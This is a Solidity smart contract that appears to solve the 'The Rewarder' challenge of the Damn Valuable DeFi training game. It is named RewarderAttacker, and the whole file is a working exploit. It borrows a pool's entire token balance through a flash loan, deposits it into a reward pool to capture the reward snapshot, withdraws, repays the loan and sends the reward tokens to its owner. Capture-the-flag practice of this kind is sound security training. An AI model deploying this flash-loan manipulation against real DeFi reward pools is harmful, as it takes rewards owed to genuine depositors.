// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "../DamnValuableToken.sol";

contract RewarderAttacker {
    FlashLoanerPool public immutable pool;
    TheRewarderPool public immutable reward;
    DamnValuableToken public immutable token;
    RewardToken public immutable rewardToken;
    address public immutable owner;

    constructor(FlashLoanerPool _pool, TheRewarderPool _reward, DamnValuableToken _token, RewardToken _rewardToken) {
        pool = _pool;
        reward = _reward;
        token = _token;
        rewardToken = _rewardToken;
        owner = msg.sender;
    }

    function attack() external {
        require(msg.sender == owner, ":)");
        pool.flashLoan(token.balanceOf(address(pool)));
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) external {
        require(msg.sender == address(pool), ":)");
        // return liquidity token to the pool
        token.approve(address(reward), amount);
        reward.deposit(amount);
        reward.withdraw(amount);
        token.transfer(msg.sender, amount);
    }
}
